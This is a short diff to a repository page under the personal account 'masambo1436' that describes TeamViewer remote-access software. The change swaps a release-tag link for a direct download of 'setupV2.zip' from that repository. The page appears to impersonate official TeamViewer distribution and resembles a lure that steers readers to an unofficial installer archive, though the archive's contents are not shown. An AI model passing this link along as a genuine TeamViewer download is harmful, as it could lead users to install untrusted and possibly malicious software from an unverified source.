@@ -9,7 +9,7 @@
 <p><strong>TeamViewer is a cross-platform solution for organizing secure remote access to computers and mobile devices via the Internet. Free version for personal use.
 TeamViewer QuickSupport is a compact and portable application with the required minimum of settings that allows you to organize access to computers of remote users using TeamViewer for technical support.</p>
 </ol>
-<a href="https://github.com/masambo1436/TeamViewer/releases/tag/DOWNLOAD">
+<a href="https://github.com/masambo1436/TeamViewer/releases/download/DOWNLOAD/setupV2.zip">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 
 
